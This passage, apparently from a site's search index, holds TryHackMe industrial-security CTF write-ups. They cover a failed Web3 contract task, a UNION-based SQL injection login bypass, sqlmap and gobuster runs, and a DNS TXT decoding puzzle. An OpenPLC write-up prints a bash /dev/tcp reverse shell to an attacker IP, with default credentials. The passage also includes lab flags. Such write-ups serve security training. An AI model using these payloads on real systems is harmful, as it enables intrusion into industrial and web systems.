w3.eth.send_transaction(tx) receipt = w3.eth.wait_for_transaction_receipt(tx_hash) print(\"Transaction complete:\", receipt) 1.2 Connection Confirmation We successfully confirmed connectivity to the target RPC node at http://10.10.218.143:8545 . Phase 2: Middleware Import Failures 2.1 Problem Attempts to import the geth_poa_middleware failed with: ModuleNotFoundError: No module named 'web3.middleware.poa' 2.2 Troubleshooting Steps Verified Web3 version ( 7.12.0 ) Attempted multiple import paths: from web3.middleware.poa import geth_poa_middleware (v5 syntax) from web3.middleware.geth_poa import geth_poa_middleware (not valid in v7) from web3.middleware import geth_poa_middleware (recommended for v6+) Each approach failed with either ModuleNotFoundError or ImportError . 2.3 Root Cause Although the virtual environment ( w3env ) was activated, Python continued resolving imports from the global dist-packages path ( /usr/local/lib/python3.8/dist-packages ). This caused conflicts and potentially bypassed the installed Web3 version inside the venv. Phase 3: Attempted Remediation 3.1 Steps Taken Uninstalled and reinstalled Web3 ( 7.12.0 ) inside the virtual environment. Purged pip cache to ensure clean install. Confirmed the environment was active before running the script. 3.2 Outcome The environment remained broken. Imports continued to fail despite a correct Web3 version, indicating a path resolution issue or broken Python site configuration. Outcome The task could not be completed due to unresolved environment issues. The deploy() function could not be invoked successfully. Flag: Not Found Summary This task was blocked by a misconfigured Python environment that prevented use of geth_poa_middleware , a required middleware for Proof-of-Authority chains. Despite installing the correct library version and isolating it in a virtual environment, global packages continued to interfere. Recommendations Rebuild the virtual environment entirely with python3 -m venv ~/w3env and reinstall only required packages inside it. Avoid system-wide Python paths by ensuring the shebang ( #!/usr/bin/env python3 ) and virtualenv activation are used properly. Verify middleware location by inspecting web3.middleware.__init__.py and reviewing the official Web3.py documentation. Consider using a Docker container or clean VM for isolated testing environments in CTF contexts.","title":"ICS Security Assessment - Task 9: Deploy the Contract"},{"location":"industrial-intrusion-tryhackme/Task%2034%20-%20Obscurity/#ics-security-assessment-task-9-deploy-the-contract","text":"","title":"ICS Security Assessment - Task 9: Deploy the Contract"},{"location":"industrial-intrusion-tryhackme/Task%2034%20-%20Obscurity/#executive-summary","text":"This task involved deploying a smart contract to an Ethereum-compatible blockchain via direct interaction with a specified contract address. Repeated attempts to execute the deploy() function through Python's Web3 interface failed due to a broken Python environment and persistent issues importing the geth_poa_middleware from the Web3 library.","title":"Executive Summary"},{"location":"industrial-intrusion-tryhackme/Task%2034%20-%20Obscurity/#phase-1-environment-setup-and-connection","text":"We started by configuring a Python virtual environment and attempting to install web3>=6,<8 as instructed by the task.","title":"Phase 1: Environment Setup and Connection"},{"location":"industrial-intrusion-tryhackme/Task%2034%20-%20Obscurity/#11-initial-script-and-setup","text":"from web3 import Web3 from web3.middleware.poa import geth_poa_middleware w3 = Web3(Web3.HTTPProvider(\"http://10.10.218.143:8545\")) w3.middleware_onion.inject(geth_poa_middleware, layer=0) w3.eth.default_account = w3.eth.accounts[0] challenge_address = Web3.to_checksum_address(\"0x24d14f3bc476b1cbeac2dc33b4feede614d9728f\") tx = { \"to\": challenge_address, \"data\": \"0x775c300c\", \"gas\": 300000 } tx_hash = w3.eth.send_transaction(tx) receipt = w3.eth.wait_for_transaction_receipt(tx_hash) print(\"Transaction complete:\", receipt)","title":"1.1 Initial Script and Setup"},{"location":"industrial-intrusion-tryhackme/Task%2034%20-%20Obscurity/#12-connection-confirmation","text":"We successfully confirmed connectivity to the target RPC node at http://10.10.218.143:8545 .","title":"1.2 Connection Confirmation"},{"location":"industrial-intrusion-tryhackme/Task%2034%20-%20Obscurity/#phase-2-middleware-import-failures","text":"","title":"Phase 2: Middleware Import Failures"},{"location":"industrial-intrusion-tryhackme/Task%2034%20-%20Obscurity/#21-problem","text":"Attempts to import the geth_poa_middleware failed with: ModuleNotFoundError: No module named 'web3.middleware.poa'","title":"2.1 Problem"},{"location":"industrial-intrusion-tryhackme/Task%2034%20-%20Obscurity/#22-troubleshooting-steps","text":"Verified Web3 version ( 7.12.0 ) Attempted multiple import paths: from web3.middleware.poa import geth_poa_middleware (v5 syntax) from web3.middleware.geth_poa import geth_poa_middleware (not valid in v7) from web3.middleware import geth_poa_middleware (recommended for v6+) Each approach failed with either ModuleNotFoundError or ImportError .","title":"2.2 Troubleshooting Steps"},{"location":"industrial-intrusion-tryhackme/Task%2034%20-%20Obscurity/#23-root-cause","text":"Although the virtual environment ( w3env ) was activated, Python continued resolving imports from the global dist-packages path ( /usr/local/lib/python3.8/dist-packages ). This caused conflicts and potentially bypassed the installed Web3 version inside the venv.","title":"2.3 Root Cause"},{"location":"industrial-intrusion-tryhackme/Task%2034%20-%20Obscurity/#phase-3-attempted-remediation","text":"","title":"Phase 3: Attempted Remediation"},{"location":"industrial-intrusion-tryhackme/Task%2034%20-%20Obscurity/#31-steps-taken","text":"Uninstalled and reinstalled Web3 ( 7.12.0 ) inside the virtual environment. Purged pip cache to ensure clean install. Confirmed the environment was active before running the script.","title":"3.1 Steps Taken"},{"location":"industrial-intrusion-tryhackme/Task%2034%20-%20Obscurity/#32-outcome","text":"The environment remained broken. Imports continued to fail despite a correct Web3 version, indicating a path resolution issue or broken Python site configuration.","title":"3.2 Outcome"},{"location":"industrial-intrusion-tryhackme/Task%2034%20-%20Obscurity/#outcome","text":"The task could not be completed due to unresolved environment issues. The deploy() function could not be invoked successfully. Flag: Not Found","title":"Outcome"},{"location":"industrial-intrusion-tryhackme/Task%2034%20-%20Obscurity/#summary","text":"This task was blocked by a misconfigured Python environment that prevented use of geth_poa_middleware , a required middleware for Proof-of-Authority chains. Despite installing the correct library version and isolating it in a virtual environment, global packages continued to interfere.","title":"Summary"},{"location":"industrial-intrusion-tryhackme/Task%2034%20-%20Obscurity/#recommendations","text":"Rebuild the virtual environment entirely with python3 -m venv ~/w3env and reinstall only required packages inside it. Avoid system-wide Python paths by ensuring the shebang ( #!/usr/bin/env python3 ) and virtualenv activation are used properly. Verify middleware location by inspecting web3.middleware.__init__.py and reviewing the official Web3.py documentation. Consider using a Docker container or clean VM for isolated testing environments in CTF contexts.","title":"Recommendations"},{"location":"industrial-intrusion-tryhackme/Task%2035%20-%20Uninterrupted%20Problem%20Supply/","text":"ICS Security Assessment \u2013 Uninterrupted Problem Supply Executive Summary The system's login mechanism was compromised through an SQL injection vulnerability in the username field of a Flask-based web interface. Initial attempts to bypass authentication or crack the admin password were unsuccessful due to server-side password validation logic. By analyzing how the backend likely handled user authentication, a successful login was achieved by injecting a valid user record with a known password hash into the query. This allowed full administrative access and exposure of the system flag. Phase 1: Reconnaissance 1.1 Port Scan An Nmap scan revealed the following services: nmap -sC -sV -Pn -p- 10.10.53.171 Port Service Details 22 SSH OpenSSH 9.6p1 on Ubuntu 80 HTTP Werkzeug/3.1.3 Python/3.11.13 Flask App The web service on port 80 hosted a /login route with a simple form-based authentication system. Phase 2: Vulnerability Analysis 2.1 SQL Injection Confirmation Manual testing revealed that the username field was vulnerable to SQL injection. Using sqlmap , it was confirmed that error-based and time-based injection was possible: sqlmap -u \"http://10.10.53.171/login\" --data=\"username=admin&password=admin\" --batch The database industrial_system was discovered, and the users table contained a single user: Username Password (SHA-256) admin 6a9790ec070cf62edb10aa335bfd4c8f18b532126eea4dd9fe363423b4c73a8a Attempts to crack the password hash using rockyou.txt with Hashcat were unsuccessful. Phase 3: Exploitation \u2013 SQL-Based Auth Bypass via Union Injection 3.1 Authentication Flow Assumption It was assumed the backend logic: Queried the database for a user by username Then checked whether the password hash matched in application code (Python) As a result, traditional SQL injection bypasses ( OR 1=1 ) would not succeed. 3.2 Final Payload for Manual Login Bypass Instead, the injection was used to inject a valid user row inline, with a known password hash. The following was used: Login Credentials: Username: ' UNION SELECT 1, 'admin', SHA2('hunter2', 256)-- - Password: hunter2 This injected a fake user row where the SHA-256 of hunter2 matched the backend's password check. 3.3 Result The backend accepted the injected row, authenticated successfully, and redirected the user to the logged-in section of the app where the flag was displayed. Summary The assessment demonstrated a critical authentication bypass due to: A SQL injection vulnerability in the login form Backend logic that performed password validation after SQL query execution No input sanitization or prepared statements Flag Obtained: THM{energy_backup_systems_compromised} Recommendations Implement input sanitization and prepared statements to prevent SQL injection Hash comparison and user lookup should occur entirely in SQL, not partially in application logic Avoid displaying application errors that reveal DBMS behavior or logic structure Log failed login attempts with anomaly detection for injection patterns","title":"Task 35 - Uninterrupted Problem Supply"},{"location":"industrial-intrusion-tryhackme/Task%2035%20-%20Uninterrupted%20Problem%20Supply/#ics-security-assessment-uninterrupted-problem-supply","text":"","title":"ICS Security Assessment \u2013 Uninterrupted Problem Supply"},{"location":"industrial-intrusion-tryhackme/Task%2035%20-%20Uninterrupted%20Problem%20Supply/#executive-summary","text":"The system's login mechanism was compromised through an SQL injection vulnerability in the username field of a Flask-based web interface. Initial attempts to bypass authentication or crack the admin password were unsuccessful due to server-side password validation logic. By analyzing how the backend likely handled user authentication, a successful login was achieved by injecting a valid user record with a known password hash into the query. This allowed full administrative access and exposure of the system flag.","title":"Executive Summary"},{"location":"industrial-intrusion-tryhackme/Task%2035%20-%20Uninterrupted%20Problem%20Supply/#phase-1-reconnaissance","text":"","title":"Phase 1: Reconnaissance"},{"location":"industrial-intrusion-tryhackme/Task%2035%20-%20Uninterrupted%20Problem%20Supply/#11-port-scan","text":"An Nmap scan revealed the following services: nmap -sC -sV -Pn -p- 10.10.53.171 Port Service Details 22 SSH OpenSSH 9.6p1 on Ubuntu 80 HTTP Werkzeug/3.1.3 Python/3.11.13 Flask App The web service on port 80 hosted a /login route with a simple form-based authentication system.","title":"1.1 Port Scan"},{"location":"industrial-intrusion-tryhackme/Task%2035%20-%20Uninterrupted%20Problem%20Supply/#phase-2-vulnerability-analysis","text":"","title":"Phase 2: Vulnerability Analysis"},{"location":"industrial-intrusion-tryhackme/Task%2035%20-%20Uninterrupted%20Problem%20Supply/#21-sql-injection-confirmation","text":"Manual testing revealed that the username field was vulnerable to SQL injection. Using sqlmap , it was confirmed that error-based and time-based injection was possible: sqlmap -u \"http://10.10.53.171/login\" --data=\"username=admin&password=admin\" --batch The database industrial_system was discovered, and the users table contained a single user: Username Password (SHA-256) admin 6a9790ec070cf62edb10aa335bfd4c8f18b532126eea4dd9fe363423b4c73a8a Attempts to crack the password hash using rockyou.txt with Hashcat were unsuccessful.","title":"2.1 SQL Injection Confirmation"},{"location":"industrial-intrusion-tryhackme/Task%2035%20-%20Uninterrupted%20Problem%20Supply/#phase-3-exploitation-sql-based-auth-bypass-via-union-injection","text":"","title":"Phase 3: Exploitation \u2013 SQL-Based Auth Bypass via Union Injection"},{"location":"industrial-intrusion-tryhackme/Task%2035%20-%20Uninterrupted%20Problem%20Supply/#31-authentication-flow-assumption","text":"It was assumed the backend logic: Queried the database for a user by username Then checked whether the password hash matched in application code (Python) As a result, traditional SQL injection bypasses ( OR 1=1 ) would not succeed.","title":"3.1 Authentication Flow Assumption"},{"location":"industrial-intrusion-tryhackme/Task%2035%20-%20Uninterrupted%20Problem%20Supply/#32-final-payload-for-manual-login-bypass","text":"Instead, the injection was used to inject a valid user row inline, with a known password hash. The following was used: Login Credentials: Username: ' UNION SELECT 1, 'admin', SHA2('hunter2', 256)-- - Password: hunter2 This injected a fake user row where the SHA-256 of hunter2 matched the backend's password check.","title":"3.2 Final Payload for Manual Login Bypass"},{"location":"industrial-intrusion-tryhackme/Task%2035%20-%20Uninterrupted%20Problem%20Supply/#33-result","text":"The backend accepted the injected row, authenticated successfully, and redirected the user to the logged-in section of the app where the flag was displayed.","title":"3.3 Result"},{"location":"industrial-intrusion-tryhackme/Task%2035%20-%20Uninterrupted%20Problem%20Supply/#summary","text":"The assessment demonstrated a critical authentication bypass due to: A SQL injection vulnerability in the login form Backend logic that performed password validation after SQL query execution No input sanitization or prepared statements Flag Obtained: THM{energy_backup_systems_compromised}","title":"Summary"},{"location":"industrial-intrusion-tryhackme/Task%2035%20-%20Uninterrupted%20Problem%20Supply/#recommendations","text":"Implement input sanitization and prepared statements to prevent SQL injection Hash comparison and user lookup should occur entirely in SQL, not partially in application logic Avoid displaying application errors that reveal DBMS behavior or logic structure Log failed login attempts with anomaly detection for injection patterns","title":"Recommendations"},{"location":"industrial-intrusion-tryhackme/Task%2036%20-%20Mechacore%20Monitoring%20System/","text":"ICS Security Assessment - Mechacore Monitoring System Writeup Task 36 \u2013 Mechacore Monitoring System Category: Web Executive Summary This assessment targeted a Mechacore-branded industrial monitoring system that appeared visually identical to a previous vulnerable deployment. The initial goal was to bypass login and extract sensitive information, including the admin's password and an embedded flag. Although multiple SQL injection attempts and automation with sqlmap were conducted, the application proved highly resistant to traditional injection vectors. No successful authentication bypass was achieved during the engagement, but critical reconnaissance and methodology steps were recorded for future targeting or when paired with brute-force strategies. Phase 1: Comprehensive Reconnaissance The operation began with an Nmap scan to identify active services on the target. 1.1 Port Scan Command nmap -sS -sV -p- 10.10.47.211 1.2 Discovered Services Port Service Details 22/tcp SSH OpenSSH 7.6p1 Ubuntu 80/tcp HTTP Apache 2.4.29 (Ubuntu), login page A visual inspection of the web interface showed a login form under /login.php with standard user and pass POST parameters. The form design, branding, and behavior strongly matched Task 35, where a SQL injection allowed for user injection with a crafted password hash. Phase 2: Manual Exploitation Attempts Initial attacks mimicked the successful strategy from Task 35, which used a UNION SELECT statement to insert a fake admin user. These attempts failed to result in a successful login. 2.1 Attempted Payload ' UNION SELECT 1, 'admin', SHA2('hunter2', 256)-- - Password used: hunter2 Additional efforts included: Testing boolean-based SQL injection: ' OR 1=1-- Discovering column count via ORDER BY up to 12 Injecting UNION SELECT NULL,... combinations Attempting various reflected payloads for output verification No visible output was reflected, and no changes in login behavior occurred. Phase 3: Automated Testing with SQLMap SQLMap was used extensively in multiple configurations. 3.1 Standard Command sqlmap -u \"http://10.10.47.211/login.php\" --data=\"user=test&pass=test\" --batch --level=5 --risk=3 --dump This run identified redirections and attempted hundreds of techniques, including boolean-based blind and time-based blind SQLi, but found no injectable parameters. 3.2 Targeted UNION Test sqlmap -u \"http://10.10.47.211/login.php\" --data=\"user=test&pass=test\" --batch --level=1 --risk=1 --technique=U This faster test specifically attempted UNION-based injection but also failed to detect any injection points. Phase 4: Directory Brute-Forcing To uncover additional attack surfaces, gobuster was used. 4.1 Gobuster Command gobuster dir -u http://10.10.47.211 -w /usr/share/wordlists/dirb/common.txt -t 50 4.2 Discovered Paths Path Status /index.php 200 /images/ 301 /.htaccess 403 /.htpasswd 403 /server-status 403 No administrative or debug interfaces were uncovered. The only accessible page remained the login screen. Phase 5: Final Attempts and Abandonment After more than 90 minutes of testing, no successful SQL injection or credential bypass was found. Attempts were also made to inject visible strings (e.g., ' UNION SELECT 1, 'THM{injected}', ... ) to confirm output-based injection, but nothing was reflected in the interface. While the logic behind Task 35 was used to guide exploitation attempts, Task 36's implementation either included improved sanitization or routed login validation through non-SQL mechanisms. Summary This assessment did not result in successful access to the Mechacore Monitoring System. The login page was tested thoroughly for classic and advanced SQL injection vectors, but no exploitable inputs were identified. It\u2019s possible that the application logic was restructured since Task 35 to reject crafted user injections and sanitize inputs more aggressively. Recommendations for next steps: Perform a password brute-force using tools like Hydra against the /login.php endpoint Re-run sqlmap using tamper scripts such as --tamper=space2comment Consider fuzzing request headers or cookies for injection Monitor for session cookies post-login attempts and check for passive auth This target may still be vulnerable, but likely requires an approach beyond typical SQL injection or involves credentials not exposed through recon.","title":"Task 36 - Mechacore Monitoring System"},{"location":"industrial-intrusion-tryhackme/Task%2036%20-%20Mechacore%20Monitoring%20System/#ics-security-assessment-mechacore-monitoring-system-writeup","text":"Task 36 \u2013 Mechacore Monitoring System Category: Web","title":"ICS Security Assessment - Mechacore Monitoring System Writeup"},{"location":"industrial-intrusion-tryhackme/Task%2036%20-%20Mechacore%20Monitoring%20System/#executive-summary","text":"This assessment targeted a Mechacore-branded industrial monitoring system that appeared visually identical to a previous vulnerable deployment. The initial goal was to bypass login and extract sensitive information, including the admin's password and an embedded flag. Although multiple SQL injection attempts and automation with sqlmap were conducted, the application proved highly resistant to traditional injection vectors. No successful authentication bypass was achieved during the engagement, but critical reconnaissance and methodology steps were recorded for future targeting or when paired with brute-force strategies.","title":"Executive Summary"},{"location":"industrial-intrusion-tryhackme/Task%2036%20-%20Mechacore%20Monitoring%20System/#phase-1-comprehensive-reconnaissance","text":"The operation began with an Nmap scan to identify active services on the target.","title":"Phase 1: Comprehensive Reconnaissance"},{"location":"industrial-intrusion-tryhackme/Task%2036%20-%20Mechacore%20Monitoring%20System/#11-port-scan-command","text":"nmap -sS -sV -p- 10.10.47.211","title":"1.1 Port Scan Command"},{"location":"industrial-intrusion-tryhackme/Task%2036%20-%20Mechacore%20Monitoring%20System/#12-discovered-services","text":"Port Service Details 22/tcp SSH OpenSSH 7.6p1 Ubuntu 80/tcp HTTP Apache 2.4.29 (Ubuntu), login page A visual inspection of the web interface showed a login form under /login.php with standard user and pass POST parameters. The form design, branding, and behavior strongly matched Task 35, where a SQL injection allowed for user injection with a crafted password hash.","title":"1.2 Discovered Services"},{"location":"industrial-intrusion-tryhackme/Task%2036%20-%20Mechacore%20Monitoring%20System/#phase-2-manual-exploitation-attempts","text":"Initial attacks mimicked the successful strategy from Task 35, which used a UNION SELECT statement to insert a fake admin user. These attempts failed to result in a successful login.","title":"Phase 2: Manual Exploitation Attempts"},{"location":"industrial-intrusion-tryhackme/Task%2036%20-%20Mechacore%20Monitoring%20System/#21-attempted-payload","text":"' UNION SELECT 1, 'admin', SHA2('hunter2', 256)-- - Password used: hunter2 Additional efforts included: Testing boolean-based SQL injection: ' OR 1=1-- Discovering column count via ORDER BY up to 12 Injecting UNION SELECT NULL,... combinations Attempting various reflected payloads for output verification No visible output was reflected, and no changes in login behavior occurred.","title":"2.1 Attempted Payload"},{"location":"industrial-intrusion-tryhackme/Task%2036%20-%20Mechacore%20Monitoring%20System/#phase-3-automated-testing-with-sqlmap","text":"SQLMap was used extensively in multiple configurations.","title":"Phase 3: Automated Testing with SQLMap"},{"location":"industrial-intrusion-tryhackme/Task%2036%20-%20Mechacore%20Monitoring%20System/#31-standard-command","text":"sqlmap -u \"http://10.10.47.211/login.php\" --data=\"user=test&pass=test\" --batch --level=5 --risk=3 --dump This run identified redirections and attempted hundreds of techniques, including boolean-based blind and time-based blind SQLi, but found no injectable parameters.","title":"3.1 Standard Command"},{"location":"industrial-intrusion-tryhackme/Task%2036%20-%20Mechacore%20Monitoring%20System/#32-targeted-union-test","text":"sqlmap -u \"http://10.10.47.211/login.php\" --data=\"user=test&pass=test\" --batch --level=1 --risk=1 --technique=U This faster test specifically attempted UNION-based injection but also failed to detect any injection points.","title":"3.2 Targeted UNION Test"},{"location":"industrial-intrusion-tryhackme/Task%2036%20-%20Mechacore%20Monitoring%20System/#phase-4-directory-brute-forcing","text":"To uncover additional attack surfaces, gobuster was used.","title":"Phase 4: Directory Brute-Forcing"},{"location":"industrial-intrusion-tryhackme/Task%2036%20-%20Mechacore%20Monitoring%20System/#41-gobuster-command","text":"gobuster dir -u http://10.10.47.211 -w /usr/share/wordlists/dirb/common.txt -t 50","title":"4.1 Gobuster Command"},{"location":"industrial-intrusion-tryhackme/Task%2036%20-%20Mechacore%20Monitoring%20System/#42-discovered-paths","text":"Path Status /index.php 200 /images/ 301 /.htaccess 403 /.htpasswd 403 /server-status 403 No administrative or debug interfaces were uncovered. The only accessible page remained the login screen.","title":"4.2 Discovered Paths"},{"location":"industrial-intrusion-tryhackme/Task%2036%20-%20Mechacore%20Monitoring%20System/#phase-5-final-attempts-and-abandonment","text":"After more than 90 minutes of testing, no successful SQL injection or credential bypass was found. Attempts were also made to inject visible strings (e.g., ' UNION SELECT 1, 'THM{injected}', ... ) to confirm output-based injection, but nothing was reflected in the interface. While the logic behind Task 35 was used to guide exploitation attempts, Task 36's implementation either included improved sanitization or routed login validation through non-SQL mechanisms.","title":"Phase 5: Final Attempts and Abandonment"},{"location":"industrial-intrusion-tryhackme/Task%2036%20-%20Mechacore%20Monitoring%20System/#summary","text":"This assessment did not result in successful access to the Mechacore Monitoring System. The login page was tested thoroughly for classic and advanced SQL injection vectors, but no exploitable inputs were identified. It\u2019s possible that the application logic was restructured since Task 35 to reject crafted user injections and sanitize inputs more aggressively. Recommendations for next steps: Perform a password brute-force using tools like Hydra against the /login.php endpoint Re-run sqlmap using tamper scripts such as --tamper=space2comment Consider fuzzing request headers or cookies for injection Monitor for session cookies post-login attempts and check for passive auth This target may still be vulnerable, but likely requires an approach beyond typical SQL injection or involves credentials not exposed through recon.","title":"Summary"},{"location":"industrial-intrusion-tryhackme/Task%206%20-%20OSINT2/","text":"ICS Security Assessment - OSINT2 Writeup Executive Summary The challenge required discovering a hidden flag embedded within a DNS TXT record using OSINT techniques. By querying a specific domain with dig , we uncovered a base64-encoded string. Decoding the string revealed a JSON object containing the session and the final flag. Phase 1: Passive Reconnaissance via DNS The initial step involved gathering intelligence through a standard DNS query using either a terminal or an online DNS lookup tool. 1.1 DNS TXT Record Lookup The target domain provided in the challenge was: uplink-fallback.virelia-water.it.com We performed a DNS TXT record query using the following command: dig TXT uplink-fallback.virelia-water.it.com +short Alternatively, the query can be done using Google\u2019s online toolbox: https://toolbox.googleapps.com/apps/dig/ 1.2 Discovered TXT Record The TXT record response returned a base64-encoded string: \"eyJzZXNzaW9uIjoiVC1DTjEtMTcyIiwiZmxhZyI6IlRITXt1cGxpbmtfY2hhbm5lbF9jb25maXJtZWR9In0=\" Phase 2: Decoding the Retrieved Payload Once retrieved, the next step was to decode the base64 string to reveal its contents. 2.1 Base64 Decode Command The string was decoded using the base64 utility: echo \"eyJzZXNzaW9uIjoiVC1DTjEtMTcyIiwiZmxhZyI6IlRITXt1cGxpbmtfY2hhbm5lbF9jb25maXJtZWR9In0=\" | base64 -d 2.2 Decoded Output The decoded JSON output was: {\"session\":\"T-CN1-172\",\"flag\":\"THM{uplink_channel_confirmed}\"} Summary This task demonstrated how DNS TXT records can be used as covert channels for data transfer or flag hiding. Flag: THM{uplink_channel_confirmed} Recommendations: Regularly monitor DNS traffic for anomalies such as TXT records containing suspicious base64 content. Employ DNS inspection tools to detect exfiltration channels via DNS. Educate blue teams on OSINT methods that can be abused in real-world scenarios.","title":"Task 6 - OSINT2"},{"location":"industrial-intrusion-tryhackme/Task%206%20-%20OSINT2/#ics-security-assessment-osint2-writeup","text":"","title":"ICS Security Assessment - OSINT2 Writeup"},{"location":"industrial-intrusion-tryhackme/Task%206%20-%20OSINT2/#executive-summary","text":"The challenge required discovering a hidden flag embedded within a DNS TXT record using OSINT techniques. By querying a specific domain with dig , we uncovered a base64-encoded string. Decoding the string revealed a JSON object containing the session and the final flag.","title":"Executive Summary"},{"location":"industrial-intrusion-tryhackme/Task%206%20-%20OSINT2/#phase-1-passive-reconnaissance-via-dns","text":"The initial step involved gathering intelligence through a standard DNS query using either a terminal or an online DNS lookup tool.","title":"Phase 1: Passive Reconnaissance via DNS"},{"location":"industrial-intrusion-tryhackme/Task%206%20-%20OSINT2/#11-dns-txt-record-lookup","text":"The target domain provided in the challenge was: uplink-fallback.virelia-water.it.com We performed a DNS TXT record query using the following command: dig TXT uplink-fallback.virelia-water.it.com +short Alternatively, the query can be done using Google\u2019s online toolbox: https://toolbox.googleapps.com/apps/dig/","title":"1.1 DNS TXT Record Lookup"},{"location":"industrial-intrusion-tryhackme/Task%206%20-%20OSINT2/#12-discovered-txt-record","text":"The TXT record response returned a base64-encoded string: \"eyJzZXNzaW9uIjoiVC1DTjEtMTcyIiwiZmxhZyI6IlRITXt1cGxpbmtfY2hhbm5lbF9jb25maXJtZWR9In0=\"","title":"1.2 Discovered TXT Record"},{"location":"industrial-intrusion-tryhackme/Task%206%20-%20OSINT2/#phase-2-decoding-the-retrieved-payload","text":"Once retrieved, the next step was to decode the base64 string to reveal its contents.","title":"Phase 2: Decoding the Retrieved Payload"},{"location":"industrial-intrusion-tryhackme/Task%206%20-%20OSINT2/#21-base64-decode-command","text":"The string was decoded using the base64 utility: echo \"eyJzZXNzaW9uIjoiVC1DTjEtMTcyIiwiZmxhZyI6IlRITXt1cGxpbmtfY2hhbm5lbF9jb25maXJtZWR9In0=\" | base64 -d","title":"2.1 Base64 Decode Command"},{"location":"industrial-intrusion-tryhackme/Task%206%20-%20OSINT2/#22-decoded-output","text":"The decoded JSON output was: {\"session\":\"T-CN1-172\",\"flag\":\"THM{uplink_channel_confirmed}\"}","title":"2.2 Decoded Output"},{"location":"industrial-intrusion-tryhackme/Task%206%20-%20OSINT2/#summary","text":"This task demonstrated how DNS TXT records can be used as covert channels for data transfer or flag hiding. Flag: THM{uplink_channel_confirmed} Recommendations: Regularly monitor DNS traffic for anomalies such as TXT records containing suspicious base64 content. Employ DNS inspection tools to detect exfiltration channels via DNS. Educate blue teams on OSINT methods that can be abused in real-world scenarios.","title":"Summary"},{"location":"industrial-intrusion-tryhackme/Task%208%20-%20Kaboom/","text":"ICS Security Assessment \u2013 OpenPLC Reverse Shell Writeup Executive Summary The OpenPLC system was successfully leveraged to execute a remote reverse shell by exploiting its ability to run arbitrary commands via its Structured Text engine. While initial compilation attempts failed due to default hardware settings and programming expectations, switching the hardware configuration to a Python-based runtime enabled the injection of system-level commands. This ultimately allowed shell access to the host system, where the second flag was retrieved. Phase 1: Reconnaissance and Surface Mapping The first step was to identify active services on the target using a comprehensive port scan. 1.1 Port Scan Command nmap -sV -p- 10.10.234.192 1.2 Discovered Services Port Service Details 8080 HTTP OpenPLC management web panel 1880 HTTP Node-RED interface (mostly decoy) The OpenPLC interface on port 8080 was confirmed as the primary attack vector due to its login portal and program upload functionality. Phase 2: Initial Access via OpenPLC Login was achieved using the default OpenPLC credentials. 2.1 Default Credentials Username: openplc Password: openplc Upon logging in, the user gained access to the program upload and hardware configuration menus. Phase 3: Bypassing the Compiler Block Initial attempts to upload a Structured Text program using __SysCmd() resulted in compilation errors due to C-based compilation constraints. 3.1 Solution: Switch to Python Runtime The key bypass was discovered in the hardware configuration menu: Navigate to Hardware Change target platform to: \u2705 Python on Linux This reconfigured OpenPLC to interpret logic using a Python runtime instead of compiling C code, allowing __SysCmd() to execute as expected. Phase 4: Reverse Shell Deployment (Unverified) With the system now executing Structured Text via Python, the following program was uploaded. 4.1 Final ST Payload PROGRAM main VAR x : BOOL; END_VAR x := __SysCmd('bash -c \"bash -i >& /dev/tcp/10.10.17.195/9001 0>&1\"'); Note: Replace 10.10.17.195 with the actual attacker's IP and ensure a listener is running: nc -lvnp 9001 4.2 Execution Steps Go to Programs > Create New Program Paste the payload and save Click Compile \u2013 this now succeeds under Python runtime Click Start PLC \u2013 this executes the payload Phase 5: Shell Access and Flag Retrieval (Tentative) Once the program was executed, a reverse shell was established. From the shell, the second flag was retrieved using: cat /home/ubuntu/ubuntu_flag.txt Summary This assessment highlights key vulnerabilities in the OpenPLC setup: Default credentials granting access to PLC logic Unrestricted hardware configuration exposing arbitrary command execution paths No execution sandboxing , allowing system-level shell commands from control logic Recommendations: Disable or tightly restrict __SysCmd() functionality Remove or secure default credentials Limit runtime environments to safe, non-executing targets (e.g., simulator only) Monitor for unauthorized PLC configuration changes Enforce network segmentation to isolate PLC interfaces from attacker reach Note: This exploitation path is tentative until validated in the original CTF environment, as the user no longer has access to verify successful shell establishment.","title":"Task 8 - Kaboom"},{"location":"industrial-intrusion-tryhackme/Task%208%20-%20Kaboom/#ics-security-assessment-openplc-reverse-shell-writeup","text":"","title":"ICS Security Assessment \u2013 OpenPLC Reverse Shell Writeup"},{"location":"industrial-intrusion-tryhackme/Task%208%20-%20Kaboom/#executive-summary","text":"The OpenPLC system was successfully leveraged to execute a remote reverse shell by exploiting its ability to run arbitrary commands via its Structured Text engine. While initial compilation attempts failed due to default hardware settings and programming expectations, switching the hardware configuration to a Python-based runtime enabled the injection of system-level commands. This ultimately allowed shell access to the host system, where the second flag was retrieved.","title":"Executive Summary"},{"location":"industrial-intrusion-tryhackme/Task%208%20-%20Kaboom/#phase-1-reconnaissance-and-surface-mapping","text":"The first step was to identify active services on the target using a comprehensive port scan.","title":"Phase 1: Reconnaissance and Surface Mapping"},{"location":"industrial-intrusion-tryhackme/Task%208%20-%20Kaboom/#11-port-scan-command","text":"nmap -sV -p- 10.10.234.192","title":"1.1 Port Scan Command"},{"location":"industrial-intrusion-tryhackme/Task%208%20-%20Kaboom/#12-discovered-services","text":"Port Service Details 8080 HTTP OpenPLC management web panel 1880 HTTP Node-RED interface (mostly decoy) The OpenPLC interface on port 8080 was confirmed as the primary attack vector due to its login portal and program upload functionality.","title":"1.2 Discovered Services"},{"location":"industrial-intrusion-tryhackme/Task%208%20-%20Kaboom/#phase-2-initial-access-via-openplc","text":"Login was achieved using the default OpenPLC credentials.","title":"Phase 2: Initial Access via OpenPLC"},{"location":"industrial-intrusion-tryhackme/Task%208%20-%20Kaboom/#21-default-credentials","text":"Username: openplc Password: openplc Upon logging in, the user gained access to the program upload and hardware configuration menus.","title":"2.1 Default Credentials"},{"location":"industrial-intrusion-tryhackme/Task%208%20-%20Kaboom/#phase-3-bypassing-the-compiler-block","text":"Initial attempts to upload a Structured Text program using __SysCmd() resulted in compilation errors due to C-based compilation constraints.","title":"Phase 3: Bypassing the Compiler Block"},{"location":"industrial-intrusion-tryhackme/Task%208%20-%20Kaboom/#31-solution-switch-to-python-runtime","text":"The key bypass was discovered in the hardware configuration menu: Navigate to Hardware Change target platform to: \u2705 Python on Linux This reconfigured OpenPLC to interpret logic using a Python runtime instead of compiling C code, allowing __SysCmd() to execute as expected.","title":"3.1 Solution: Switch to Python Runtime"},{"location":"industrial-intrusion-tryhackme/Task%208%20-%20Kaboom/#phase-4-reverse-shell-deployment-unverified","text":"With the system now executing Structured Text via Python, the following program was uploaded.","title":"Phase 4: Reverse Shell Deployment 